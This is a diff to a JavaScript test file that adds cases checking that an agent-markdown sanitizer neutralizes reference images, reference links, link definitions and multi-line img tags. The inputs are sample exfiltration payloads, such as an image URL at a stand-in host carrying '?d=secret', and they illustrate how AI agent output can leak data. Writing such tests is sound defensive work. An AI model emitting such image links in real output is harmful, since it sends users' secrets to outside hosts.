@@ -9,3 +9,10 @@ test('agent markdown keeps formatting but drops HTML, remote images and live lin
   assert.equal(agentMarkdown('<img src="https://evil.test/p"><b>bold</b>'), 'bold');
   assert.equal(agentMarkdown(null), '');
 });
+
+test('reference images, reference links, definitions and multi-line tags are neutralized too', () => {
+  assert.equal(agentMarkdown('![a][ref]\n\n[ref]: https://evil.test/x.png?d=secret').trim(), 'a');
+  assert.equal(agentMarkdown('![shortcut]\n[shortcut]: https://evil.test/s.png').trim(), 'shortcut');
+  assert.equal(agentMarkdown('Go to [docs][1]\n[1]: https://evil.test').trim(), 'Go to docs');
+  assert.equal(agentMarkdown('<img\n src="https://evil.test/p">done'), 'done');
+});
